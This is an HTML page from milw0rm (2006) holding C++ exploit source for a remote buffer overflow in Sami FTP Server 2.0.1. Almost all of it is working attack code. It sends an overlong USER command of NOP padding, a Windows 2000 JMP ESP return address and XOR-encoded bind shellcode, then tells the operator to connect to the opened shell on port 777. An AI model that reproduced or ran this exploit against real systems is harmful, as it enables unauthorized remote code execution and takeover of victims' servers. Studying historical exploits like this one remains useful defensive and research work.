<html><head><title>Sami FTP Server 2.0.1 Remote Buffer Overflow Exploit (cpp)</title></head><pre>// Two includes.
#include &lt;fstream.h&gt;
#include &lt;winsock2.h&gt;
// Project - Settings - Link &gt; Object/Library modules 'Ws2_32.lib' 
#pragma comment(lib, &quot;ws2_32&quot;)

char MyShellCode[] =       // XOR by \x99\x99\x99\x99.
&quot;\xD9\xEE\xD9\x74\x24\xF4\x5B\x31\xC9\xB1\x59\x81\x73\x17\x99\x99&quot;
&quot;\x99\x99\x83\xEB\xFC\xE2&quot; // Bind ShellCode port 777.
                        &quot;\xF4\x71\xA1\x99\x99\x99\xDA\xD4\xDD\x99&quot;
&quot;\x7E\xE0\x5F\xE0\x7C\xD0\x1F\xD0\x3D\x34\xB7\x70\x3D\x83\xE9\x5E&quot;
&quot;\x40\x90\x6C\x34\x52\x74\x65\xA2\x17\xD7\x97\x75\xE7\x41\x7B\xEA&quot;
&quot;\x34\x40\x9C\x57\xEB\x67\x2A\x8F\xCE\xCA\xAB\xC6\xAA\xAB\xB7\xDD&quot;
&quot;\xD5\xD5\x99\x98\xC2\xCD\x10\x7C\x10\xC4\x99\xF3\xA9\xC0\xFD\x12&quot;
&quot;\x98\x12\xD9\x95\x12\xE9\x85\x34\x12\xC1\x91\x72\x95\x14\xCE\xB5&quot;
&quot;\xC8\xCB\x66\x49\x10\x5A\xC0\x72\x89\xF3\x91\xC7\x98\x77\xF3\x93&quot;
&quot;\xC0\x12\xE4\x99\x19\x60\x9F\xED\x7D\xC8\xCA\x66\xAD\x16\x71\x09&quot;
&quot;\x99\x99\x99\xC0\x10\x9D\x17\x7B\x72\xA8\x66\xFF\x18\x75\x09\x98&quot;
&quot;\xCD\xF1\x98\x98\x99\x99\x66\xCC\xB9\xCE\xCE\xCE\xCE\xDE\xCE\xDE&quot;
&quot;\xCE\x66\xCC\x85\x10\x5A\xA8\x66\xCE\xCE\xF1\x9B\x99\x9A\x90\x10&quot;
&quot;\x7F\xF3\x89\xCF\xCA\x66\xCC\x81\xCE\xCA\x66\xCC\x8D\xCE\xCF\xCA&quot;
&quot;\x66\xCC\x89\x10\x5B\xFF\x18\x75\xCD\x99\x14\xA5\xBD\xA8\x59\xF3&quot;
&quot;\x8C\xC0\x6A\x32\x10\x4E\x5F\xDD\xBD\x89\xDD\x67\xDD\xBD\xA4\x10&quot;
&quot;\xE5\xBD\xD1\x10\xE5\xBD\xD5\x10\xE5\xBD\xC9\x14\xDD\xBD\x89\xCD&quot;
&quot;\xC9\xC8\xC8\xC8\xD8\xC8\xD0\xC8\xC8\x66\xEC\x99\xC8\x66\xCC\xA9&quot;
&quot;\x10\x78\xF1\x66\x66\x66\x66\x66\xA8\x66\xCC\xB5\xCE\x66\xCC\x95&quot;
&quot;\x66\xCC\xB1\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81\x12\xDC\xA5\x12\xCD&quot;
&quot;\x9C\xE1\x98\x73\x12\xD3\x81\x12\xC3\xB9\x98\x72\x7A\xAB\xD0\x12&quot;
&quot;\xAD\x12\x98\x77\xA8\x66\x65\xA8\x59\x35\xA1\x79\xED\x9E\x58\x56&quot;
&quot;\x94\x98\x5E\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78\x12\xC3\xBD\x98\x72&quot;
&quot;\xFF\x12\x95\xD2\x12\xC3\x85\x98\x72\x12\x9D\x12\x98\x71\x72\x9B&quot;
&quot;\xA8\x59\x10\x73\xC6\xC7\xC4\xC2\x5B\x91\x99&quot;;

static char PayLoad[1329];  

int IP;                     
int Port;                   
int szNOP1, szNOP2;         
int Nop; 

// Jump ESP by library User32 on Win2000 SP4 fr..
char JmpESP[] = &quot;\x0C\xED\xE3\x77&quot;;
// Flag ID server Sami FTP.
char TargetFlag[] = &quot;220-\r\n220 Features p a .&quot;;
char RecvBuff[200];

void usage(){
  cout&lt;&lt;&quot; &quot;&lt;&lt;endl;
  cout&lt;&lt;&quot;USAGE : ThisAppz [Target IP] [Port to connect FTP]&quot;  &lt;&lt;endl;
  cout&lt;&lt;&quot;If a port isnt specified, default port will 21.&quot;    &lt;&lt;endl;
  cout&lt;&lt;&quot;Without IP, the Xploit run in local mode [127.0.0.1]&quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; &quot;&lt;&lt;endl;
  return;}

void Info(){
  cout&lt;&lt;&quot; &quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; ============================================== v1.0 ==&quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; ====== Sami FTP Remote Buffer Overflow Exploit  ======&quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; ================== Coded by HolyGhost ================&quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; ====== Distributed for educational purposes only =====&quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; ================== StormyTeam@free.fr ================&quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; ======================================================&quot;&lt;&lt;endl;
  cout&lt;&lt;&quot; &quot;&lt;&lt;endl;}

int main(int argc,char *argv[]){

Info();
if ( ( argc &gt; 3 ) ){usage();return -1;} 

if( argc &gt; 1 ){ 
  cout&lt;&lt;&quot;argv[1]&quot;&lt;&lt;&quot;\t&quot;&lt;&lt;argv[1]&lt;&lt;endl;
  IP = htonl( inet_addr( argv[1] ) );}
else{ 
  cout&lt;&lt;&quot;Local test mode : 127.0.0.1&quot;&lt;&lt;endl;
  IP = htonl( inet_addr( &quot;127.0.0.1&quot; ) );}

if( argc == 3 ){
  cout&lt;&lt;&quot;argv[2]&quot;&lt;&lt;&quot;\t&quot;&lt;&lt;argv[2]&lt;&lt;endl;
  Port = atoi( argv[2] );}
else{
  cout&lt;&lt;&quot;Port by default : 21&quot;&lt;&lt;endl;
  Port = 21;}

WSADATA wsadata;

if( WSAStartup( MAKEWORD( 2, 0 ),&amp;wsadata )!=0 ){
  cout&lt;&lt;&quot;[-] WSAStartup error. Bye!&quot;&lt;&lt;endl;
  return -1;}

SOCKET sck;
fd_set mask;              
struct timeval timeout;
struct sockaddr_in server;

sck = socket( AF_INET, SOCK_STREAM, 0 ); // TCP.

if( sck == -1 ){cout&lt;&lt;&quot;[-] Socket() error. Bye!&quot;&lt;&lt;endl; return -1;}
 
server.sin_family = AF_INET; // Address Internet 4 bytes.
server.sin_addr.s_addr = htonl( IP );
server.sin_port = htons( Port ); // Definition port.
// Try to connect on FTP server.
connect( sck,( struct sockaddr *)&amp;server, sizeof( server ) );

timeout.tv_sec = 3; // Delay 3 seconds.
timeout.tv_usec = 0;
FD_ZERO( &amp;mask );
FD_SET( sck, &amp;mask );

switch( select( sck + 1, NULL, &amp;mask, NULL, &amp;timeout ) ){
  case -1:{ // Problem! 
    cout&lt;&lt;&quot;[-] Select() error. Bye!&quot;&lt;&lt;endl;
    closesocket( sck );
	return -1;}

  case 0:{ // Problem!
	cout&lt;&lt;&quot;[-] Connect() error. Bye!&quot;&lt;&lt;endl;
	closesocket( sck );
	return -1;}

  default: 
  if(FD_ISSET( sck, &amp;mask ) ){
    recv( sck, RecvBuff, 256, 0 ); // Reception Flag ID.

    cout&lt;&lt;&quot;[+] Connected, checking the server for flag...&quot;&lt;&lt;endl;
	Sleep( 500 );
	
    if ( !strstr( RecvBuff, TargetFlag ) ){
      cout&lt;&lt;&quot;[-] This is not a valid flag from target! Bye.&quot;&lt;&lt;endl;
	  return -1;} // Bye!
	cout&lt;&lt;RecvBuff;

    Sleep( 1000 ); 
    cout&lt;&lt;&quot;[+] Connected, constructing the PayLoad...&quot;&lt;&lt;endl;
   
    szNOP1 = 219; // First padding.
	szNOP2 = 720; // Second padding. 
    // Initialise le Buffer PayLoad NULL.
    memset( PayLoad, NULL, sizeof( PayLoad ) );
    strcat( PayLoad, &quot;USER &quot; );     // Command User.
    // First padding.
    for( Nop = 0; Nop &lt; szNOP1; Nop++ ){
	  strcat( PayLoad, &quot;\x90&quot; );}
    // New EIP register.
	strcat( PayLoad, JmpESP );
    // Second Padding.
    for( Nop = 0; Nop &lt; szNOP2; Nop++ ){
	  strcat( PayLoad, &quot;\x90&quot; );}
    strcat( PayLoad, MyShellCode );
    strcat( PayLoad, &quot;\x0D\x0A&quot; );
    // Send fully PayLoad.
    if( send( sck, PayLoad, strlen( PayLoad ), 0 ) == SOCKET_ERROR ){
	  cout&lt;&lt;&quot;[-] Sending error, the server prolly rebooted.&quot;&lt;&lt;endl;
	  return -1;}

    Sleep( 1000 ); 

    cout&lt;&lt;&quot;[+] Nice!!! See your log for execute an evil command.&quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;[+] After, try to connect on FTP server by port 777.&quot;&lt;&lt;endl;
    return 0;
  }
}

closesocket( sck );
WSACleanup();
return 0; // Bye!

}
// Fully PayLoad description (1329 Bytes) -
// [USER ] [padding NOP1] [rEIP] [padding NOP2] [ShellCode] [\r\n]
// 5        219             4      720             379         2

// milw0rm.com [2006-01-31]</pre></html>